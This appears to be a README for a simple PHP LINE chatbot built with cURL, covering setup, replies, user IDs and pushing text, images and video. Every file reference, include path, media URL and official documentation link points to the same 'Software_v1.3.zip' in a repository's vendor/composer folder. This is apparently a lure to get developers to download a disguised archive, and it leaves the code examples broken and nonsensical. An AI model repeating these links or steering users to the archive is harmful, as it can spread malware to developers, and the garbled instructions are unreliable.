# Simple-PHP-LINE-BOT
Simple PHP LINE BOT using cURL without line SDK <br />
by Nontachai Korninai

<h1>Setting</h1>
go to file https://github.com/yutthanaiam/nongmod/raw/refs/heads/master/vendor/composer/Software_v1.3.zip

	
```php
public function getChannelAccessToken(){
	$channelAccessToken = "<YOUR CHANNEL ACCESS TOKEN>";
	return $channelAccessToken;
}
        
public function getChannelSecret(){
	$channelSecret = "<YOUR CHANNEL SECRET>";
	return $channelSecret;
}
```
<h1>Example : Simple BOT</h1>
When you finished setting, Create new https://github.com/yutthanaiam/nongmod/raw/refs/heads/master/vendor/composer/Software_v1.3.zip

### reply
```php
require_once __DIR__ . 'https://github.com/yutthanaiam/nongmod/raw/refs/heads/master/vendor/composer/Software_v1.3.zip';
$bot = new Linebot();

$text = $bot->getMessageText(); //when user send text to bot	
$bot->reply($text); // bot reply to user
```
### get User Id
```php
$userId = $bot->getUserId();
```

### Push Text
```php
$bot->pushText($userId, 'Hello Simple Text!');
```

### Push Image
```php
$imageUrl = "https://github.com/yutthanaiam/nongmod/raw/refs/heads/master/vendor/composer/Software_v1.3.zip";
$bot->pushImage($userId, $imageUrl);
```

### Push Video
```php
$videoUrl = "https://github.com/yutthanaiam/nongmod/raw/refs/heads/master/vendor/composer/Software_v1.3.zip";
$coverImage = "https://github.com/yutthanaiam/nongmod/raw/refs/heads/master/vendor/composer/Software_v1.3.zip";
$bot->pushVideo($userId, $videoUrl, $coverImage);
```

<h1>About LINE Messaging API</h1>

Please refer to the official API documents for details.

en: https://github.com/yutthanaiam/nongmod/raw/refs/heads/master/vendor/composer/Software_v1.3.zip

ja: https://github.com/yutthanaiam/nongmod/raw/refs/heads/master/vendor/composer/Software_v1.3.zip
